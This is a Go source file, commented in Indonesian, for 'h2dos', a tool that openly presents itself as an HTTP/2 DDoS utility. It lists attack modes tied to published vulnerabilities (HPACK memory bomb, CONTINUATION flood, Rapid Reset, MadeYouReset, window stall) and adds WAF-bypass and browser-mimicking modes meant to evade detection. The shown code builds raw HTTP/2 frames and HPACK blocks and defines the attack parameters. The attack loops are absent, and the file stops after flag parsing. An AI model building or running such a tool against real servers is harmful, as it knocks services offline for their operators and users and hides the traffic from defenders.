// h2dos — alat uji beban / DDoS dengan metode HTTP/2 (h2 lewat TLS, atau h2c cleartext).
//
// Modus generasi terbaru (2024-2026):
//
//	bomb      : HTTP/2 Bomb (CVE-2026-49975) — HPACK indexed-reference bomb + jendela
//	          flow-control 0 byte; 1 byte di jaringan -> puluhan byte RAM server, dan
//	          RAM itu ditahan supaya tidak pernah bebas. DEFAULT.
//	stall     : window stall / HTTP2Crash (2026) — SETTINGS_INITIAL_WINDOW_SIZE=0 +
//	          request ke aset besar + WINDOW_UPDATE 1 byte menetes
//	myreset   : MadeYouReset (CVE-2025-8671) — frame cacat memaksa SERVER mengirim
//	          RST_STREAM, jadi mitigasi "rate client RST_STREAM" tidak kena
//	contflood : CONTINUATION Flood (CVE-2024-27316) — CONTINUATION tanpa batas pada
//	          satu stream; memori/CPU habis, request tidak masuk access log
//
// Modus klasik (masih tersedia):
//
//	flood    : koneksi persisten + stream multiplexed (throughput maksimal)
//	reset    : Rapid Reset (CVE-2023-44487) — HEADERS lalu RST_STREAM massal
//
// Alat ukur efek serangan: -probe (deteksi DOWN/PULIH), -rss (RAM proses target),
// -max-rss (rem darurat), -conn-rate (batas handshake/detik).
//
// Hanya memakai Go standard library. Jalankan: go run h2dos.go -target https://host/path
package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var started time.Time

// ---------------- protokol HTTP/2 ----------------

const preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

const (
	frData          = 0x0
	frHeaders       = 0x1
	frPriority      = 0x2
	frReset         = 0x3
	frSettings      = 0x4
	frPushPromise   = 0x5
	frPing          = 0x6
	frGoaway        = 0x7
	frWindowUpdate  = 0x8
	frContinuation  = 0x9
	flEndStream     = 0x1
	flEndHeaders    = 0x4
	flAck           = 0x1
	flPadded        = 0x8
	flPriority      = 0x20
	settingMaxConns = 0x3
)

// kode GOAWAY/RST_STREAM yang sering muncul (RFC 9113 7).
var goawayNames = map[uint32]string{
	0: "NO_ERROR", 1: "PROTOCOL_ERROR", 2: "INTERNAL_ERROR", 3: "FLOW_CONTROL_ERROR",
	4: "SETTING_TIMEOUT", 5: "STREAM_CLOSED", 6: "FRAME_SIZE_ERROR", 7: "REFUSED_STREAM",
	8: "CANCEL", 9: "COMPRESSION_ERROR", 10: "CONNECT_ERROR", 11: "ENHANCE_YOUR_CALM",
	12: "INADEQUATE_SECURITY", 13: "SETTINGS_TIMEOUT",
}

// staticTable: entri HPACK tanpa Huffman (nama, nilai), indeks 62 = terakhir.
// staticTable: tabel statis HPACK, 61 entri persis RFC 7541 Appendix A
var staticTable = [62][2]string{
	{}, // 0 tidak dipakai
	{":authority", ""},
	{":method", "GET"},
	{":method", "POST"},
	{":path", "/"},
	{":path", "/index.html"},
	{":scheme", "http"},
	{":scheme", "https"},
	{":status", "200"},
	{":status", "204"},
	{":status", "206"},
	{":status", "304"},
	{":status", "400"},
	{":status", "404"},
	{":status", "500"},
	{"accept-charset", ""},
	{"accept-encoding", "gzip, deflate"},
	{"accept-language", ""},
	{"accept-ranges", ""},
	{"accept", ""},
	{"access-control-allow-origin", ""},
	{"age", ""},
	{"allow", ""},
	{"authorization", ""},
	{"cache-control", ""},
	{"content-disposition", ""},
	{"content-encoding", ""},
	{"content-language", ""},
	{"content-length", ""},
	{"content-location", ""},
	{"content-range", ""},
	{"content-type", ""},
	{"cookie", ""},
	{"date", ""},
	{"etag", ""},
	{"expect", ""},
	{"expires", ""},
	{"from", ""},
	{"host", ""},
	{"if-match", ""},
	{"if-modified-since", ""},
	{"if-none-match", ""},
	{"if-range", ""},
	{"if-unmodified-since", ""},
	{"last-modified", ""},
	{"link", ""},
	{"location", ""},
	{"max-forwards", ""},
	{"proxy-authenticate", ""},
	{"proxy-authorization", ""},
	{"range", ""},
	{"referer", ""},
	{"refresh", ""},
	{"retry-after", ""},
	{"server", ""},
	{"set-cookie", ""},
	{"strict-transport-security", ""},
	{"transfer-encoding", ""},
	{"user-agent", ""},
	{"vary", ""},
	{"via", ""},
	{"www-authenticate", ""},
}

// hpackWrInt menulis integer dengan prefix lebar tertentu (RFC 7541 5.1).
// high = bit-bit atas byte pertama, misalnya 0x80 (indexed), 0x40 (insert),
// 0x10 (literal), 0x00 (string tanpa Huffman).
func hpackWrInt(b []byte, prefix uint8, high byte, n int) []byte {
	max := int(1<<prefix) - 1
	if n < max {
		return append(b, high|byte(n))
	}
	b = append(b, high|byte(max))
	n -= max
	for n >= 0x80 {
		b = append(b, byte(n&0x7f)|0x80)
		n >>= 7
	}
	return append(b, byte(n))
}

// hpackStr menulis string mentah (H-bit = 0) dengan panjang yang sah, termasuk
// yang lebih panjang dari 127 byte.
func hpackStr(b []byte, s string) []byte {
	b = hpackWrInt(b, 7, 0x00, len(s))
	return append(b, s...)
}

// hpackField: satu header literal TANPA masuk dynamic table (prefiks 0001),
// nama diambil dari tabel statis bila ada. Tanpa Huffman supaya murah CPU.
func hpackField(b []byte, name, value string) []byte {
	nl := strings.ToLower(name)
	idx := 0
	for i := 1; i < 62; i++ {
		if staticTable[i][0] == nl {
			idx = i
			break
		}
	}
	b = hpackWrInt(b, 4, 0x10, idx)
	if idx == 0 {
		b = hpackStr(b, nl)
	}
	return hpackStr(b, value)
}

// hpackFieldH seperti hpackField tapi nilainya dimampat Huffman: lebih pendek,
// cocok untuk header yang nilainya panjang (cookie, path).
func hpackFieldH(b []byte, name, value string) []byte {
	nl := strings.ToLower(name)
	idx := 0
	for i := 1; i < 62; i++ {
		if staticTable[i][0] == nl {
			idx = i
			break
		}
	}
	b = hpackWrInt(b, 4, 0x10, idx)
	if idx == 0 {
		b = hpackHuff(b, nl)
	}
	return hpackHuff(b, value)
}

// hpackInsert memasukkan header ke dynamic table lawan (0b01xxxxxx) -> indeks 62,
// yang lalu bisa direferensikan dengan 1 byte: 0x80|62 = 0xBE.
func hpackInsert(name, value string) []byte {
	b := make([]byte, 0, len(name)+len(value)+3)
	b = append(b, 0x40)
	b = hpackStr(b, name)
	b = hpackStr(b, value)
	return b
}

// Pseudo-header yang bisa dikirim sebagai satu byte karena ada di tabel statis:
// 0x82 = :method GET, 0x86 = :scheme http, 0x87 = :scheme https.
var (
	hdrMethodGet  = []byte{0x82}
	hdrMethodHead = []byte{0x12, 0x04, 'H', 'E', 'A', 'D'} // nama :method, nilai literal
	hdrSchemeHTTP = []byte{0x86}
	hdrSchemeTLS  = []byte{0x87}
)

// ---------------- HPACK Huffman (RFC 7541 B) ----------------
//
// Browser sungguhan selalu memampatkan nama/nilai header dengan Huffman. Tanpa
// ini blok header kita gampang dikenali mesin WAF sebagai "bukan browser".

type HuffSym struct {
	code uint32
	bits uint8
}

// huffTable: 257 entri, indeks 0..255 = byte, 256 = END-OF-STRING (padding).
// huffTable: 257 entri (0..255 = byte, 256 = END-OF-STRING), RFC 7541 B.
var huffTable = [257]HuffSym{
	{0x1ff8, 13}, {0x7fffd8, 23}, {0xfffffe2, 28}, {0xfffffe3, 28},
	{0xfffffe4, 28}, {0xfffffe5, 28}, {0xfffffe6, 28}, {0xfffffe7, 28},
	{0xfffffe8, 28}, {0xffffea, 24}, {0x3ffffffc, 30}, {0xfffffe9, 28},
	{0xfffffea, 28}, {0x3ffffffd, 30}, {0xfffffeb, 28}, {0xfffffec, 28},
	{0xfffffed, 28}, {0xfffffee, 28}, {0xfffffef, 28}, {0xffffff0, 28},
	{0xffffff1, 28}, {0xffffff2, 28}, {0x3ffffffe, 30}, {0xffffff3, 28},
	{0xffffff4, 28}, {0xffffff5, 28}, {0xffffff6, 28}, {0xffffff7, 28},
	{0xffffff8, 28}, {0xffffff9, 28}, {0xffffffa, 28}, {0xffffffb, 28},
	{0x14, 6}, {0x3f8, 10}, {0x3f9, 10}, {0xffa, 12},
	{0x1ff9, 13}, {0x15, 6}, {0xf8, 8}, {0x7fa, 11},
	{0x3fa, 10}, {0x3fb, 10}, {0xf9, 8}, {0x7fb, 11},
	{0xfa, 8}, {0x16, 6}, {0x17, 6}, {0x18, 6},
	{0x0, 5}, {0x1, 5}, {0x2, 5}, {0x19, 6},
	{0x1a, 6}, {0x1b, 6}, {0x1c, 6}, {0x1d, 6},
	{0x1e, 6}, {0x1f, 6}, {0x5c, 7}, {0xfb, 8},
	{0x7ffc, 15}, {0x20, 6}, {0xffb, 12}, {0x3fc, 10},
	{0x1ffa, 13}, {0x21, 6}, {0x5d, 7}, {0x5e, 7},
	{0x5f, 7}, {0x60, 7}, {0x61, 7}, {0x62, 7},
	{0x63, 7}, {0x64, 7}, {0x65, 7}, {0x66, 7},
	{0x67, 7}, {0x68, 7}, {0x69, 7}, {0x6a, 7},
	{0x6b, 7}, {0x6c, 7}, {0x6d, 7}, {0x6e, 7},
	{0x6f, 7}, {0x70, 7}, {0x71, 7}, {0x72, 7},
	{0xfc, 8}, {0x73, 7}, {0xfd, 8}, {0x1ffb, 13},
	{0x7fff0, 19}, {0x1ffc, 13}, {0x3ffc, 14}, {0x22, 6},
	{0x7ffd, 15}, {0x3, 5}, {0x23, 6}, {0x4, 5},
	{0x24, 6}, {0x5, 5}, {0x25, 6}, {0x26, 6},
	{0x27, 6}, {0x6, 5}, {0x74, 7}, {0x75, 7},
	{0x28, 6}, {0x29, 6}, {0x2a, 6}, {0x7, 5},
	{0x2b, 6}, {0x76, 7}, {0x2c, 6}, {0x8, 5},
	{0x9, 5}, {0x2d, 6}, {0x77, 7}, {0x78, 7},
	{0x79, 7}, {0x7a, 7}, {0x7b, 7}, {0x7ffe, 15},
	{0x7fc, 11}, {0x3ffd, 14}, {0x1ffd, 13}, {0xffffffc, 28},
	{0xfffe6, 20}, {0x3fffd2, 22}, {0xfffe7, 20}, {0xfffe8, 20},
	{0x3fffd3, 22}, {0x3fffd4, 22}, {0x3fffd5, 22}, {0x7fffd9, 23},
	{0x3fffd6, 22}, {0x7fffda, 23}, {0x7fffdb, 23}, {0x7fffdc, 23},
	{0x7fffdd, 23}, {0x7fffde, 23}, {0xffffeb, 24}, {0x7fffdf, 23},
	{0xffffec, 24}, {0xffffed, 24}, {0x3fffd7, 22}, {0x7fffe0, 23},
	{0xffffee, 24}, {0x7fffe1, 23}, {0x7fffe2, 23}, {0x7fffe3, 23},
	{0x7fffe4, 23}, {0x1fffdc, 21}, {0x3fffd8, 22}, {0x7fffe5, 23},
	{0x3fffd9, 22}, {0x7fffe6, 23}, {0x7fffe7, 23}, {0xffffef, 24},
	{0x3fffda, 22}, {0x1fffdd, 21}, {0xfffe9, 20}, {0x3fffdb, 22},
	{0x3fffdc, 22}, {0x7fffe8, 23}, {0x7fffe9, 23}, {0x1fffde, 21},
	{0x7fffea, 23}, {0x3fffdd, 22}, {0x3fffde, 22}, {0xfffff0, 24},
	{0x1fffdf, 21}, {0x3fffdf, 22}, {0x7fffeb, 23}, {0x7fffec, 23},
	{0x1fffe0, 21}, {0x1fffe1, 21}, {0x3fffe0, 22}, {0x1fffe2, 21},
	{0x7fffed, 23}, {0x3fffe1, 22}, {0x7fffee, 23}, {0x7fffef, 23},
	{0xfffea, 20}, {0x3fffe2, 22}, {0x3fffe3, 22}, {0x3fffe4, 22},
	{0x7ffff0, 23}, {0x3fffe5, 22}, {0x3fffe6, 22}, {0x7ffff1, 23},
	{0x3ffffe0, 26}, {0x3ffffe1, 26}, {0xfffeb, 20}, {0x7fff1, 19},
	{0x3fffe7, 22}, {0x7ffff2, 23}, {0x3fffe8, 22}, {0x1ffffec, 25},
	{0x3ffffe2, 26}, {0x3ffffe3, 26}, {0x3ffffe4, 26}, {0x7ffffde, 27},
	{0x7ffffdf, 27}, {0x3ffffe5, 26}, {0xfffff1, 24}, {0x1ffffed, 25},
	{0x7fff2, 19}, {0x1fffe3, 21}, {0x3ffffe6, 26}, {0x7ffffe0, 27},
	{0x7ffffe1, 27}, {0x3ffffe7, 26}, {0x7ffffe2, 27}, {0xfffff2, 24},
	{0x1fffe4, 21}, {0x1fffe5, 21}, {0x3ffffe8, 26}, {0x3ffffe9, 26},
	{0xffffffd, 28}, {0x7ffffe3, 27}, {0x7ffffe4, 27}, {0x7ffffe5, 27},
	{0xfffec, 20}, {0xfffff3, 24}, {0xfffed, 20}, {0x1fffe6, 21},
	{0x3fffe9, 22}, {0x1fffe7, 21}, {0x1fffe8, 21}, {0x7ffff3, 23},
	{0x3fffea, 22}, {0x3fffeb, 22}, {0x1ffffee, 25}, {0x1ffffef, 25},
	{0xfffff4, 24}, {0xfffff5, 24}, {0x3ffffea, 26}, {0x7ffff4, 23},
	{0x3ffffeb, 26}, {0x7ffffe6, 27}, {0x3ffffec, 26}, {0x3ffffed, 26},
	{0x7ffffe7, 27}, {0x7ffffe8, 27}, {0x7ffffe9, 27}, {0x7ffffea, 27},
	{0x7ffffeb, 27}, {0xffffffe, 28}, {0x7ffffec, 27}, {0x7ffffed, 27},
	{0x7ffffee, 27}, {0x7ffffef, 27}, {0x7fffff0, 27}, {0x3ffffee, 26},
	{0x3fffffff, 30},
}

var huffBuild sync.Once
var huffEnc [256]HuffSym

// huffNode: pohon dekode Huffman (max 30 bit, tapi kode terpanjang 30 -> tabel
// datar 1<<15 tidak cukup, jadi dekode jalan bit demi bit).
type huffNode struct {
	children [2]int32
	symbol   int32 // -1 = bukan daun
}

// huffTree dibangun dari huffTable; jumlah node tergantung panjang kode
// terpanjang (30 bit), jadi slice dinamis, bukan array tetap.
var (
	huffTree     []huffNode
	huffTreeOnce sync.Once
)

func buildHuff() {
	huffBuild.Do(func() {
		for i := 0; i < 256; i++ {
			huffEnc[i] = huffTable[i]
		}
	})
}

func buildHuffTree() {
	nodes := make([]huffNode, 1)
	nodes[0].symbol = -1
	nodes[0].children = [2]int32{-1, -1}
	for s := 0; s < 257; s++ {
		sy := huffTable[s]
		idx := int32(0)
		for b := int(sy.bits) - 1; b >= 0; b-- {
			var bit int32
			if sy.code&(1<<uint(b)) != 0 {
				bit = 1
			}
			c := nodes[idx].children[bit]
			if c == -1 {
				c = int32(len(nodes))
				nodes = append(nodes, huffNode{symbol: -1, children: [2]int32{-1, -1}})
				nodes[idx].children[bit] = c
			}
			idx = c
		}
		nodes[idx].symbol = int32(s)
	}
	huffTree = nodes
}

// huffDecode membongkar string Huffman bit demi bit. Sisa bit di ujung harus
// prefiks EOS (deretan bit satu, tak lebih dari 7 bit) sesuai RFC 7541 5.2.
func huffDecode(src []byte) (string, error) {
	huffTreeOnce.Do(buildHuffTree)
	var sb strings.Builder
	idx := int32(0)
	runBits, runOnes := 0, true
	total := len(src) * 8
	for pos := 0; pos < total; pos++ {
		bit := (src[pos>>3] >> uint(7-(pos&7))) & 1
		if idx < 0 {
			// jalur habis: sisa bit hanya boleh berupa padding (RFC 7541 5.2)
			break
		}
		idx = huffTree[idx].children[bit]
		runBits++
		if bit == 0 {
			runOnes = false
		}
		if idx < 0 {
			break // sama seperti di atas, diperiksa setelah loop
		}
		if s := huffTree[idx].symbol; s >= 0 {
			if s == 256 {
				return sb.String(), nil // END-OF-STRING
			}
			sb.WriteByte(byte(s))
			idx, runBits, runOnes = 0, 0, true
		}
	}
	// bit tersisa di ujung: harus prefiks EOS (deretan bit satu, tak lebih 7 bit)
	if idx != 0 && (runBits > 7 || !runOnes) {
		return sb.String(), fmt.Errorf("huffman cacat: %d bit sisa tidak sah", runBits)
	}
	return sb.String(), nil
}

// hpackHuff menambahkan satu string yang dimampat dengan Huffman, lengkap
// dengan panjangnya (H-bit = 1).
func hpackHuff(b []byte, s string) []byte {
	buildHuff()
	var acc uint64
	var nbits uint
	out := make([]byte, 0, len(s)+8)
	for i := 0; i < len(s); i++ {
		sy := huffEnc[s[i]]
		acc = acc<<sy.bits | uint64(sy.code)
		nbits += uint(sy.bits)
		for nbits >= 8 {
			nbits -= 8
			out = append(out, byte(acc>>nbits))
		}
	}
	if nbits > 0 {
		// padding = prefiks EOS, yaitu deretan bit satu sebanyak bit yang kurang
		pad := 8 - nbits
		acc = acc<<pad | ((uint64(1) << pad) - 1)
		out = append(out, byte(acc))
	}
	b = hpackWrInt(b, 7, 0x80, len(out))
	return append(b, out...)
}

// ---------------- dekode HPACK minimal ----------------
//
// Dipakai untuk membaca :status dari server dan untuk menguji teknik bypass:
// cukup untuk pseudo-header + header biasa, mendukung Huffman dan dynamic table.

type hpackHF struct {
	Name  string
	Value string
}

func hpackInt(b []byte, i int, prefix uint8) (int, int, error) {
	mask := byte((1 << prefix) - 1)
	n := int(b[i] & mask)
	i++
	if n < int(mask) {
		return n, i, nil
	}
	shift := uint(0)
	for {
		if i >= len(b) {
			return 0, i, errors.New("hpack: integer terpotong")
		}
		c := b[i]
		i++
		n += int(c&0x7f) << shift
		shift += 7
		if c&0x80 == 0 {
			return n, i, nil
		}
		if shift > 28 {
			return 0, i, errors.New("hpack: integer terlalu besar")
		}
	}
}

// hpackStr2 membaca string (H-bit menentukan Huffman) dengan batas panjang yang
// diizinkan server (63 KB) supaya tidak kebobolan nilai raksasa.
func hpackStr2(b []byte, i int, max int) (string, int, error) {
	if i >= len(b) {
		return "", i, errors.New("hpack: string terpotong")
	}
	huff := b[i]&0x80 != 0
	n, i, err := hpackInt(b, i, 7)
	if err != nil {
		return "", i, err
	}
	if n > max || i+n > len(b) {
		return "", i, errors.New("hpack: string terpotong")
	}
	raw := b[i : i+n]
	i += n
	if !huff {
		return string(raw), i, nil
	}
	s, err := huffDecode(raw)
	if err != nil {
		return "", i, err
	}
	return s, i, nil
}

func hpackName(nm string) string {
	if !strings.HasPrefix(nm, ":") {
		return strings.ToLower(nm)
	}
	return nm
}

func keep(h []hpackHF, name, val string) []hpackHF {
	if val == "" || name == "" {
		return h
	}
	return append(h, hpackHF{name, val})
}

// dynTable: tabel dinamis HPACK dengan penomoran LIFO seperti RFC 7541 2.3.3:
// entri yang paling baru masuk selalu berhak indeks 62.
type dynTable struct {
	ents  [][2]string
	sizes []int
	max   int
	used  int
}

func newDynTable(max int) *dynTable { return &dynTable{max: max} }

func (d *dynTable) add(name, value string) {
	sz := len(name) + len(value) + 32
	d.ents = append([][2]string{{name, value}}, d.ents...)
	d.sizes = append([]int{sz}, d.sizes...)
	d.used += sz
	for d.used > d.max && len(d.ents) > 0 { // buang yang paling tua
		d.used -= d.sizes[len(d.sizes)-1]
		d.ents = d.ents[:len(d.ents)-1]
		d.sizes = d.sizes[:len(d.sizes)-1]
	}
}

// get: indeks 1..61 = tabel statis, 62.. = dinamis (62 = paling baru).
func (d *dynTable) get(idx int) ([2]string, error) {
	if idx >= 1 && idx <= 61 {
		return staticTable[idx], nil
	}
	k := idx - 62
	if k >= 0 && k < len(d.ents) {
		return d.ents[k], nil
	}
	return [2]string{}, fmt.Errorf("hpack: indeks %d tidak dikenal", idx)
}

// hpackDecode membongkar satu blok HEADERS. Semua format RFC 7541 6 didukung:
// indexed (1xxxxxxx), insert (01xxxxxx), literal tanpa indeks (0000xxxx),
// literal never-indexed (0001xxxx), dan update ukuran tabel (001xxxxx).
func hpackDecode(b []byte) ([]hpackHF, error) {
	dyn := newDynTable(1 << 20)
	var out []hpackHF
	i := 0
	for i < len(b) {
		f := b[i]
		switch {
		case f&0x80 != 0: // indexed header field, prefiks 7 bit
			idx, ni, err := hpackInt(b, i, 7)
			if err != nil {
				return out, err
			}
			i = ni
			e, err := dyn.get(idx)
			if err != nil {
				return out, err
			}
			out = keep(out, hpackName(e[0]), e[1])

		case f&0xc0 == 0x40: // masuk dynamic table, prefiks nama 6 bit
			ni, nj, err := hpackInt(b, i, 6)
			if err != nil {
				return out, err
			}
			i = nj
			var name, val string
			if ni == 0 {
				if name, i, err = hpackStr2(b, i, 1<<16); err != nil {
					return out, err
				}
			} else {
				e, err2 := dyn.get(ni)
				if err2 != nil {
					return out, err2
				}
				name = e[0]
			}
			if val, i, err = hpackStr2(b, i, 1<<20); err != nil {
				return out, err
			}
			dyn.add(name, val)
			out = keep(out, hpackName(name), val)

		case f&0xe0 == 0x20: // update ukuran tabel dinamis, prefiks 5 bit
			sz, ni, err := hpackInt(b, i, 5)
			if err != nil {
				return out, err
			}
			i = ni
			dyn.max = sz
			for dyn.used > dyn.max && len(dyn.ents) > 0 {
				dyn.used -= dyn.sizes[len(dyn.sizes)-1]
				dyn.ents = dyn.ents[:len(dyn.ents)-1]
				dyn.sizes = dyn.sizes[:len(dyn.sizes)-1]
			}

		case f&0xf0 == 0x10 || f&0xf0 == 0x00: // literal, prefiks nama 4 bit
			ni, nj, err := hpackInt(b, i, 4)
			if err != nil {
				return out, err
			}
			i = nj
			var name, val string
			if ni == 0 {
				if name, i, err = hpackStr2(b, i, 1<<16); err != nil {
					return out, err
				}
			} else {
				e, err2 := dyn.get(ni)
				if err2 != nil {
					return out, err2
				}
				name = e[0]
			}
			if val, i, err = hpackStr2(b, i, 1<<20); err != nil {
				return out, err
			}
			out = keep(out, hpackName(name), val)

		default:
			return out, fmt.Errorf("hpack: opcode 0x%02x tidak dikenal", f)
		}
	}
	return out, nil
}

func statusOf(hf []hpackHF) int {
	for _, h := range hf {
		if h.Name == ":status" {
			n, _ := strconv.Atoi(h.Value)
			return n
		}
	}
	return 0
}

var oneByte = []byte{0, 0, 0, 1}
var zeroByte = []byte{0, 0, 0, 0}

func writeFrame(w io.Writer, typ byte, flags byte, stream uint32, payload []byte) error {
	var h [9]byte
	n := len(payload)
	if n > 1<<24-1 {
		return errors.New("payload terlalu besar")
	}
	h[0] = byte(n >> 16)
	h[1] = byte(n >> 8)
	h[2] = byte(n)
	h[3] = typ
	h[4] = flags
	h[5] = byte(stream >> 24)
	h[6] = byte(stream >> 16)
	h[7] = byte(stream >> 8)
	h[8] = byte(stream)
	if _, err := w.Write(h[:]); err != nil {
		return err
	}
	if n == 0 {
		return nil
	}
	_, err := w.Write(payload)
	return err
}

func settingsPayload(p ...uint32) []byte {
	b := make([]byte, 0, 6*len(p)/2)
	for i := 0; i+1 < len(p); i += 2 {
		b = append(b, byte(p[i]>>8), byte(p[i]),
			byte(p[i+1]>>24), byte(p[i+1]>>16), byte(p[i+1]>>8), byte(p[i+1]))
	}
	return b
}

// countConn mencatat byte yang benar-benar keluar ke socket (untuk kolom KIRIM MB/s).
type countConn struct {
	c net.Conn
	n atomic.Int64
}

func (w *countConn) Write(p []byte) (int, error) {
	n, err := w.c.Write(p)
	w.n.Add(int64(n))
	return n, err
}

// connMeta keadaan koneksi sisi lawan.
type connMeta struct {
	inflight    atomic.Int64 // stream yang kita tahan (bomb/stall)
	openStreams atomic.Int64 // stream klien yang belum dijawab server
	maxStreams  atomic.Int64
	maxFrame    atomic.Int64
	goaway      atomic.Bool
}

// ---------------- konfigurasi ----------------

type Config struct {
	target    string
	mode      string
	scheme    string
	hostHdr   string
	dialHost  string
	authority string

	conns    int
	streams  int
	batch    int
	dur      time.Duration
	rate     float64
	connRate float64
	recycle  int
	interval time.Duration

	path     string
	method   string
	body     string
	headers  []string
	junk     int
	bust     bool
	quiet    bool
	verbose  bool
	cpus     int
	insecure bool
	nodelay  bool
	buf      int
	dialTO   time.Duration
	writeTO  time.Duration
	stallTO  time.Duration

	bombName   string
	bombValue  string
	bombRefs   int
	initWindow int
	stallIv    time.Duration
	contSize   int
	contRandom bool
	myrPrim    string

	browser     string
	botThink    time.Duration
	botThinkJit time.Duration
	botReuse    int
	botPaths    []string
	bypass      []string
	fezOnly     []string
	bypassTest  bool
	listBypass  bool
	listFez     bool
	debug       bool
	fezN        int

	probe      string
	probeFresh bool
	probeIv    time.Duration
	probeTO    time.Duration
	probeFail  int
	probeBad   string
	stopOnDown bool
	badCodes   map[int]bool

	rss    string
	maxRSS float64
	dump   string
	mini   bool
}

var cfg Config

func flags() {
	flag.StringVar(&cfg.target, "target", "", "URL target: https:// = h2 lewat TLS, http:// = h2c")
	flag.StringVar(&cfg.mode, "mode", "bomb", "bomb | stall | myreset | contflood | flood | reset | bot | fez | bypass")
	flag.IntVar(&cfg.conns, "conns", 16, "jumlah koneksi paralel")
	flag.IntVar(&cfg.streams, "streams", 100, "batas stream per koneksi (0 = ikut SETTINGS server)")
	flag.IntVar(&cfg.batch, "batch", 64, "jumlah HEADERS per batch pada modus flood/reset (menunda batas stream)")
	flag.DurationVar(&cfg.dur, "dur", 30*time.Second, "durasi serangan, 0 = sampai Ctrl+C")
	flag.Float64Var(&cfg.rate, "rate", 0, "batas request/detik (0 = tanpa batas)")
	flag.Float64Var(&cfg.connRate, "conn-rate", 0, "batas koneksi baru/detik (0 = tanpa batas)")
	flag.IntVar(&cfg.recycle, "recycle", 0, "ganti koneksi setiap N request (0 = jangan)")
	flag.DurationVar(&cfg.interval, "report", 2*time.Second, "interval laporan")

	flag.StringVar(&cfg.path, "path", "", "override path (default dari -target)")
	flag.StringVar(&cfg.method, "method", "GET", "metode HTTP")
	flag.StringVar(&cfg.body, "data", "", "body request")
	flag.Var(&headerFlag{&cfg.headers}, "H", "header tambahan 'nama: nilai', boleh diulang")
	flag.IntVar(&cfg.junk, "junk", 0, "jumlah header pengisi acak per request")
	flag.BoolVar(&cfg.bust, "cachebust", false, "tambah query ?n=<acak> tiap request")
	flag.BoolVar(&cfg.quiet, "quiet", false, "tanpa laporan berkala")
	flag.BoolVar(&cfg.verbose, "v", false, "detail error + kode GOAWAY")
	flag.IntVar(&cfg.cpus, "cpus", 0, "GOMAXPROCS (0 = otomatis)")
	flag.BoolVar(&cfg.insecure, "insecure", true, "terima sertifikat self-signed")
	flag.BoolVar(&cfg.nodelay, "nodelay", true, "TCP_NODELAY")
	flag.IntVar(&cfg.buf, "buf", 262144, "ukuran buffer tulis per koneksi")
	flag.DurationVar(&cfg.dialTO, "timeout", 8*time.Second, "timeout koneksi + TLS")
	flag.DurationVar(&cfg.writeTO, "write-timeout", 10*time.Second, "timeout tulis")
	flag.DurationVar(&cfg.stallTO, "stall", 0, "putus koneksi yang tidak terkirim apa-apa selama ini (0 = off)")

	flag.StringVar(&cfg.bombName, "bomb-name", "x-bomb", "nama header yang ditanam ke dynamic table (bomb); 'cookie' untuk bypass limit jumlah header")
	flag.StringVar(&cfg.bombValue, "bomb-value", "", "nilai header yang ditanam (kosong = bomb buku pembukuan)")
	flag.IntVar(&cfg.bombRefs, "bomb-refs", 8192, "jumlah referensi 1-byte per request (bomb)")
	flag.IntVar(&cfg.initWindow, "init-window", -1, "SETTINGS_INITIAL_WINDOW_SIZE, -1 = otomatis (0 untuk bomb/stall)")
	flag.DurationVar(&cfg.stallIv, "stall-interval", time.Second, "interval WINDOW_UPDATE 1 byte per stream yang ditahan")
	flag.IntVar(&cfg.contSize, "cont-size", 16384, "ukuran payload CONTINUATION (contflood)")
	flag.BoolVar(&cfg.contRandom, "cont-random", false, "isi CONTINUATION byte acak (CPU dekode lebih mahal)")
	flag.StringVar(&cfg.myrPrim, "myr-prim", "data", "primitif MadeYouReset: data | window | priority")

	flag.StringVar(&cfg.browser, "browser", "auto", "sidik jari untuk modus bot: auto | chrome | edge | firefox | safari")
	flag.DurationVar(&cfg.botThink, "bot-think", 1200*time.Millisecond, "modus bot: jeda antar permintaan per koneksi (0 = secepat mungkin)")
	flag.DurationVar(&cfg.botThinkJit, "bot-jitter", 800*time.Millisecond, "modus bot: acak-acakan jeda +/- ini (anti pola terdeteksi)")
	flag.IntVar(&cfg.botReuse, "bot-reuse", 12, "modus bot: berapa permintaan per koneksi sebelum ganti koneksi baru")
	flag.Var(&listFlag{&cfg.botPaths}, "bot-paths", "modus bot: path yang diminta (boleh diulang / pisah koma)")
	flag.Var(&listFlag{&cfg.bypass}, "bypass", "modus bypass: teknik yang dipakai (default: semua)")
	flag.Var(&listFlag{&cfg.fezOnly}, "fez-only", "modus fez: teknik yang dipakai (default: semua)")
	flag.BoolVar(&cfg.bypassTest, "bypass-test", true, "modus bypass: uji tiap teknik sekali lalu cetak hasilnya")
	flag.BoolVar(&cfg.listBypass, "bypass-list", false, "daftar teknik bypass lalu berhenti")
	flag.BoolVar(&cfg.listFez, "fez-list", false, "daftar teknik fez lalu berhenti")
	flag.BoolVar(&cfg.debug, "debug", false, "log langkah internal (mencari macet)")
	flag.IntVar(&cfg.fezN, "fez-n", 1, "modus fez: jumlah permintaan sebelum ganti teknik & koneksi")

	flag.StringVar(&cfg.probe, "probe", "", "path uji ketersediaan (mis. /); h2dos mencatat waktu DOWN/PULIH")
	flag.BoolVar(&cfg.probeFresh, "probe-fresh", false, "uji pakai koneksi baru (meniru pengunjung baru)")
	flag.DurationVar(&cfg.probeIv, "probe-interval", time.Second, "interval uji ketersediaan")
	flag.DurationVar(&cfg.probeTO, "probe-timeout", 3*time.Second, "timeout satu uji")
	flag.IntVar(&cfg.probeFail, "probe-fail", 3, "jumlah gagal berturut-turut = DOWN")
	flag.StringVar(&cfg.probeBad, "probe-bad", "429,500,502,503,504", "kode status yang dianggap gagal (kosong = hanya 5xx)")
	flag.BoolVar(&cfg.stopOnDown, "stop-on-down", true, "hentikan serangan begitu target DOWN")
	flag.StringVar(&cfg.rss, "rss", "", "pantau RAM proses target: nama proses atau PID")
	flag.Float64Var(&cfg.maxRSS, "max-rss", 0, "hentikan serangan bila RAM target melewati ini (MB)")
	flag.StringVar(&cfg.dump, "dump", "", "tulis blok HEADERS pertama ke file ini lalu berhenti (untuk validasi HPACK)")
	miniSettings := flag.Bool("mini-settings", false, "kirim SETTINGS kosong (debug interoperabilitas)")
	flag.Parse()
	cfg.mini = *miniSettings
}

type headerFlag struct{ p *[]string }

func (h headerFlag) String() string { return "" }
func (h headerFlag) Set(s string) error {
	*h.p = append(*h.p, s)
	return nil
}

